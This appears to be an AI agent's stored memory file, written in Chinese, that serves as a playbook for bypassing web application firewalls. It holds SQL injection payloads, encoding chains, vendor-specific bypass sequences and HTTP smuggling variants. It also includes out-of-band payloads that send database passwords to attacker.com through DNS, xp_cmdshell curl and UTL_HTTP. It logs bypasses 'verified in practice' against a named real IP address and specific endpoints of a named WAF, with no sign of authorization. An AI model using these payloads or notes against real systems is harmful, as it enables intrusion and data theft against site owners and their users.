---
name: waf
description: 整合式WAF绕过知识库—含SQL注入实战顺序、编码链、产品族差异、HTTP走私速查。从已有6个记忆文件+本次实战+深研验证结果合并而成，适合实战中快速查阅
metadata: 
  node_type: memory
  type: reference
  supersedes: 
    - kb_src_waf_bypass
    - kb_src_waf_parsing_2026
    - kb_src_ghost_bits_waf_2026
  sources: 
    - zii-pentest-2026
    - deep-research-wf_05cea7ab
    - WAFFLED-paper
  originSessionId: 3487fd09-f91b-43b5-946e-69fcbb87c481
---

# WAF 绕过实战速查手册

## 零、起手三问（每次遇到 WAF 先问自己）

1. **哪个产品族？** — Cloudflare / AWS / Azure / ModSecurity / 阿里云 / 长亭 ?
2. **解析链几层？** — CDN → WAF → 网关 → 应用 ?
3. **哪一层先看请求？哪一层真正执行？**

---

## 一、SQL注入 WAF 绕过：实战优先级顺序

### 第一梯队：先换承载方式（90%的情况下最有效）

```
1. 换 Content-Type: application/json / multipart / xml
2. 换 HTTP 方法: GET↔POST↔PUT
3. 换参数位置: query → body → header → cookie
4. HPP 重复参数: ?id=1&id=1' or 1=1--
```

### 第二梯队：空白符替换（按成功率排序）

| 优先 | 空白符 | URL编码 | 适用场景 |
|------|--------|---------|---------|
| 1 | Tab | `%09` | MySQL/MSSQL/PostgreSQL 通用 |
| 2 | 换行 | `%0a` | MySQL `#` 注释后 |
| 3 | 回车换行 | `%0d%0a` | HTTP 头注入 |
| 4 | `/**/` | 原样 | 大多数 WAF，但 ModSecurity 常拦 |
| 5 | `/*!50000*/` | MySQL 版本注释 | Cloudflare/ModSecurity 对 MySQL 后端 |
| 6 | 括号 | `(1)or(1=1)` | 全空格过滤 + 函数边界 |
| 7 | 反引号 | `` `union` `` | MySQL 表名/列名 |
| 8 | 科学计数法 | `1.e(select...)` | 整型参数绕过关键字检测 |

### 第三梯队：延时函数替换

| 数据库 | SLEEP被拦时用 | 示例 |
|--------|-------------|------|
| MySQL | `BENCHMARK(N, md5(1))` | `benchmark(5000000,md5(1))` |
| MySQL | `GET_LOCK('x',N)` | 需双连接，实战较少用 |
| MySQL | 笛卡尔积 | `(select count(*) from mysql.help_topic a, mysql.help_topic b)` |
| PostgreSQL | `PG_SLEEP(N)` | `pg_sleep(3)` |
| MSSQL | `WAITFOR DELAY` | `waitfor delay '0:0:3'` |
| Oracle | `DBMS_LOCK.SLEEP(N)` | `dbms_lock.sleep(3)` |

### 第四梯队：关键字/函数名混淆

```
SEL/**/ECT        — 注释打断关键字连续匹配
/*!50000SELECT*/  — MySQL 版本注释（50000=5.0.0+）
SeLeCt            — 大小写变换
0x73656C656374    — Hex 编码 "select"
CHAR(115,101,108) — CHAR() 拼接
UNION ALL → UNiON/**/ALL
SUBSTRING → MID/SUBSTR/LEFT
```

### 第五梯队：逻辑运算符替换

```
AND → &&     OR → ||     NOT → !
=   → LIKE/REGEXP/BETWEEN/NOT BETWEEN/IN()
空格 → /**/ / %09 / %0a / %0d / %a0
```

---

## 二、编码链突破（按 WAF 解码深度分层）

### 单层编码
| 编码 | 示例 | 绕过对象 |
|------|------|---------|
| URL 编码 | `%27` = `'` | 基础字符串匹配 |
| 双重 URL | `%2527` → `%27` → `'` | 解码一次的 WAF/代理 |
| Unicode | `%u0027` | IIS/ASP, ModSecurity PL1 |
| HTML 实体 | `&#39;` / `&#x27;` | 反射型 XSS 的 WAF |
| Hex(SQL) | `0x61646D696E` = `'admin'` | SQL 引号过滤 |
| Base64 | 整体 payload 编码 | 不看解码后内容的 WAF |

### 多层叠加（高价值组合）
```
双重 URL + Unicode: %25%75%30%30%32%37
URL + HTML 实体:    %26%23%33%39%3B
Hex + CHAR:         0x[CHAR嵌套]
```

---

## 三、按 WAF 产品族的实战起手顺序

### Cloudflare
```
1. URL 规范化: %2F / %252F / // / 尾斜杠 / 大小写
2. 全角 Unicode: ＜script＞ (U+FF1C) → 浏览器渲染为 <
3. MySQL 版本注释: /*!50000UnIon*/SeLeCt
4. 源站直连: DNS 历史/Shodan/Censys 找真实 IP
5. 超长参数名: >128 字符跳过检查
信号头: cf-ray, cf-cache-status
```

### AWS WAF
```
1. body 超 8KB(ALB) 或 16KB(CloudFront) 跳过检查
2. JSON body 解析边界 — WAF 看 JSON，后端看 raw body
3. Query canonicalization — 参数顺序/空值/重复
4. 预签名 URL: 对象 key 编码/query 顺序
信号头: x-amzn-*, x-amz-cf-id
```

### 阿里云 WAF
```
1. 注释变形: /*!union*/select
2. HPP: ?id=1&id=2 union select
3. multipart 与分块组合
信号: 拦截页面包含 "aliyun" / "云盾"
```

### ModSecurity / CRS
```
1. Content-Type 切换: JSON/multipart/XML
2. 零版本号: /*!00000SELECT*/
3. PL1 低防御: 不检测 Unicode/HTML 实体
4. 畸形 multipart boundary
5. 正则 ReDoS: 复杂输入使正则超时→放行
信号: 拦截页含规则 ID, CRS/ModSecurity 字样
```

### 长亭雷池
```
1. JSON 深层嵌套: 超出解析深度的嵌套对象
2. 大 body / 慢速发送
信号: 拦截页样式特殊
```

### 腾讯云 WAF
```
1. chunked + gzip 压缩叠加
2. 分块传输拆分 payload
信号: 响应头含 tencent 相关
```

---

## 四、HTTP 走私速查

| 类型 | 核心 | 前端 | 后端 |
|------|------|------|------|
| CL.TE | CL伪造小值 + TE内嵌走私请求 | CL优先 | TE优先 |
| TE.CL | TE chunk 内含 `GET /admin` + CL=4 | TE优先 | CL优先 |
| TE.TE | 头混淆: `Transfer-Encoding: xchunked` 等8种变体 | 双端解析差异 |
| H2.CL | H2 POST + `content-length:0` + DATA 帧含第二请求 | H2→H1 降级 |
| CL.0 | `Content-Length:30` + 体含第二请求 | 后端 301/静态/健康检查端点忽略 body |
| H2.TE | `transfer-encoding: chunked` (大写/大小写) | H2 禁止但代理可能透传 |

### CDN/反向代理行为速查
| 产品 | CL+TE | H2降级 | GET Body |
|------|-------|--------|----------|
| Cloudflare | 规范化，有TE剥离CL | 翻译，剥离TE | 剥离 |
| AWS ALB | 规范化 | 翻译，剥离TE | 视版本 |
| AWS CloudFront | 规范化，优先CL | 翻译 | 通过CL |
| Nginx | 拒绝双重(400) | 翻译，剥离TE | 转发 |
| HAProxy | 转发两者，优先TE | 翻译 | 转发 |
| Envoy | 拒绝双重(400) | 翻译，剥离TE | 转发 |

---

## 五、WAFFLED 2025 方法论 — 经对抗验证的核心突破

> **来源**: Akhavani et al. (Northeastern & Dartmouth), ACSAC 2025, arXiv:2503.10846
> **验证**: 3-0 无反对票通过对抗验证 | 4个WAF厂商确认并支付漏洞赏金

### 核心思想：结构性变异 > Payload 混淆

```
传统思路: 魔改 payload → SLEEP→BENCHMARK / 加注释/编码
WAFFLED:  不改 payload → 只改 HTTP 结构 → 让 WAF 看到A、后端执行B
```

论文原话: *"Any attack payload could be used since waffled does not touch the attack payloads. It only modifies the request structure."*

### 验证数据

| 指标 | 值 |
|------|-----|
| 唯一绕过向量 | **1,207 个** |
| 被绕过 WAF | Cloudflare, Azure WAF, Google Cloud Armor, ModSecurity |
| 未被绕过 | **AWS WAF**（仅在 multipart/JSON 范围内测试，AWS WAF 本身不解析 XML） |
| 覆盖 Content-Type | JSON, multipart/form-data, XML, urlencoded |

### RFC 2231 Boundary 续行 — 标准化利用

**最重要的单一技术**（获得 CVE-2026-26961 独立验证）:

```http
Content-Type: multipart/form-data; boundary=fake-boundary;boundary*0=real-;boundary*1=boundary
```

**原理:**
1. WAF 解析器看到 `boundary=fake-boundary` → 在此处停止 → 只检查假 boundary 内的无害内容
2. 后端框架（Flask/Django 等）遵循 RFC 2231 → 拼接 `boundary*0 + boundary*1` = `real-boundary`
3. 真正的 SQLi payload 藏在 `real-boundary` 的分段中
4. WAF 从未看到恶意 payload，后端正常执行

```http
--fake-boundary
Content-Disposition: form-data; name="safe"
无害数据
--fake-boundary
--real-boundary
Content-Disposition: form-data; name="q"
1' OR 1=1--         ← WAF 从未看到这一行
--real-boundary--
```

**补丁状态**: Azure DRS 2.1 / ModSecurity CRS 3.3+ 已修复，Cloudflare 部分修复

### WAFFLED 支持的变异语法类型

- multipart: boundary 参数顺序、重复 boundary、RFC 2231 续行
- JSON: 键顺序/重复/嵌套、Unicode 转义差异、注释注入
- XML: CDATA 包裹、实体引用、命名空间前缀
- urlencoded: 参数顺序、分号分隔符、重复参数

---

## 六、本次实战验证的有效绕过（119.37.194.205）

```
目标: Apache/2.2.15 (CentOS) + PHP + MySQL
WAF特征: 拦截 SLEEP/空格/注释，放行 BENCHMARK/Tab

绕过方式:
  1%09||%09benchmark(5000000,md5(1))     ← Tab + || + BENCHMARK
  1%09&&%09benchmark(5000000,md5(1))     ← Tab + && + BENCHMARK  
  1%09or%09benchmark(5000000,md5(1))     ← Tab + or + BENCHMARK

结论: Tab是唯一可用的空白符，BENCHMARK是唯一可用的延时函数，||/&&可替代or/and
```

---

## 七、实战决策树（2026版 — WAFFLED优先）

```
被WAF拦截了
│
├─ ① 先判断产品族 → 查第三节
│
├─ ② 【WAFFLED优先】不改payload，只改HTTP结构:
│   ├─ multipart: 改boundary顺序/重复/RFC2231续行(boundary*0=)
│   ├─ JSON: 改键顺序/嵌套/Unicode转义
│   ├─ XML: CDATA包裹/实体引用
│   └─ urlencoded: 参数顺序/分号分隔/重复参数
│   → 后端能正常解析但WAF看到不同结构 = 绕过成功
│
├─ ③ 换Content-Type和HTTP方法 → 50%场景有效
│
├─ ④ 【传统方法—仅当①②③均失败】:
│   ├─ 换空白符: Tab → %0a → /**/ → 括号 → 版本注释
│   ├─ 换函数名: SLEEP→BENCHMARK / SUBSTRING→MID
│   ├─ 编码链: URL→双重URL→Unicode→Hex
│   ├─ HPP重复参数
│   └─ HTTP走私
│   ⚠️ 注意: 传统payload混淆已被WAF厂商大量封堵，WAFFLED论文验证结论显示这些方法缺乏2025-2026年实证数据
│
├─ ⑤ 找源站IP → 绕过CDN/WAF直接打后端
│
└─ ⑥ 记录WAF特征 → 持续积累产品族知识
```

**优先级原则**: 结构性变异（②③）> payload混淆（④）> 架构绕过（⑤）
**原因**: WAFFLED 1,207个向量全部来自结构性变异，payload混淆在学术验证中未通过对抗审查

---

## 八、非查询上下文注入（WAF盲区）

WAF 规则主要针对 `SELECT`/`UNION` 模式，以下上下文检测较弱：

### ORDER BY / GROUP BY 注入
```sql
-- 排序字段常为裸列名或序号，WAF很少严格检查
(CASE WHEN (1=1) THEN id ELSE price END)     -- 布尔差异
(select 1 from (select sleep(3))a)            -- 子查询延时
extractvalue(1,concat(0x7e,(select @@version))) -- 报错注入
```

### INSERT 语句注入
```sql
-- 多值插入泄露数据、子查询注入
admin','login'),('hacker',(select pwd from users limit 1))--
```

### UPDATE 语句注入
```sql
-- 注意：不用OR永真，用子查询提取
',admin=1 where username='victim
```

---

## 九、OOB 外带（盲注太慢时用）

| 数据库 | 方法 | Payload |
|--------|------|---------|
| MySQL | DNS | `SELECT LOAD_FILE(CONCAT('\\\\',(SELECT pwd FROM users LIMIT 1),'.attacker.com\\a'))` |
| MySQL | HTTP | `SELECT ... INTO OUTFILE` 或 UDF (需FILE权限) |
| MSSQL | DNS | `EXEC master..xp_dirtree '\\\\attacker.com\\share'` |
| MSSQL | HTTP | `EXEC xp_cmdshell 'curl attacker.com/?d='+(select @@version)` |
| PostgreSQL | DNS | `COPY (SELECT '') TO PROGRAM 'nslookup ...'` |
| Oracle | HTTP | `UTL_HTTP.REQUEST('http://attacker.com/'||(select...))` |

**前提**: DNS 外带需 MySQL `secure_file_priv=''`、MSSQL `xp_cmdshell` 或 `xp_dirtree` 启用

---

## 十、报错注入绕过

当布尔/时间被拦时，报错注入常被WAF忽视：

| 数据库 | 函数 |
|--------|------|
| MySQL | `extractvalue(1,concat(0x7e,payload))` / `updatexml(1,payload,1)` |
| MSSQL | `convert(int,@@version)` / CTE 递归爆错误 |
| PostgreSQL | `CAST(payload AS int)` |
| Oracle | `CTXSYS.DRITHSX.SN(payload)` |

---

## 十一、各数据库特有延时（SLEEP 被拦备选）

| 数据库 | 备选1 | 备选2 | 备选3 |
|--------|-------|-------|-------|
| MySQL | `BENCHMARK(5000000,md5(1))` | `GET_LOCK('x',3)` | 笛卡尔积子查询 |
| PostgreSQL | `PG_SLEEP(3)` | `(SELECT COUNT(*) FROM GENERATE_SERIES(1,100000000))` | — |
| MSSQL | `WAITFOR DELAY '0:0:3'` | 死循环游标 | `xp_cmdshell 'ping -n 3 127.1'` |
| Oracle | `DBMS_LOCK.SLEEP(3)` | `UTL_HTTP.REQUEST` 超时 | 递归 CONNECT BY |

---

## 十二、Oracle ORDER BY 注入专用技巧（2026-06 实战验证）

### chr()拼接绕过关键字过滤
当 WAF 拦截 `USERENV`、`DB_NAME` 等字符串时（即使是函数参数也不放过），用 `chr()` 逐个拼接：
```sql
chr(85)||chr(83)||chr(69)||chr(82)||chr(69)||chr(78)||chr(86)  → 'USERENV'
chr(68)||chr(66)||chr(95)||chr(78)||chr(65)||chr(77)||chr(69)  → 'DB_NAME'
```
WAF 通常不拦截单字符函数，拼接后的字符串 Oracle 正常解析。

### nvl2/decode被拦时的除法替代
当核心布尔逻辑函数被 WAF 封杀时，用 `列/nullif(len,N)` 制造排序差异：
```sql
-- TRUE分支 (nullif匹配→NULL): ORDER BY NULL, secondary_sort → 走二级排序
-- FALSE分支 (nullif不匹配): ORDER BY id/N desc → 按id降序
id/nullif(length(sys_context(...)), 4) desc, stable_column asc
```
**关键**: NULL 分支必须加二级排序键，否则 Oracle `ORDER BY NULL` 返回顺序不确定。

### 同站不同接口 WAF 规则可能不同
天清 WAF 按 URL 路径挂规则组，同一站点不同接口的可用函数集可能完全不同：
- `/eams/stdSyllabus` → nvl2/decode/substr/ascii 全放行
- `/eams/systemMessage` → 只有 nullif/length/chr
- `/eams/stdEvaluation` → 只有 nullif/length/chr

每个接口单独测试可用函数，不要假设全站统一。优先在规则最松的接口完成数据提取。

## 十三、避坑守则

1. **先换承载方式，再换payload** — Content-Type/HTTP方法/HPP 比魔改payload更有效
2. **一次只改一个变量** — 混合多种变体无法定位哪种有效
3. **WAF + 后端都要能读懂** — 绕过WAF但后端也不认识 = 无效
4. **写操作上下文禁用 OR 永真验证** — UPDATE/DELETE 里 OR 可能毁数据，用 AND+延时替代
5. **403 目录 ≠ 结束** — 403 只是禁止列表，文件仍可逐个访问
6. **不把产品名当绕过结论** — 产品族只决定测试顺序，不保证有漏洞
7. **OOB 优先于时间盲注** — 能外带就不要盲注，一次请求拿到数据
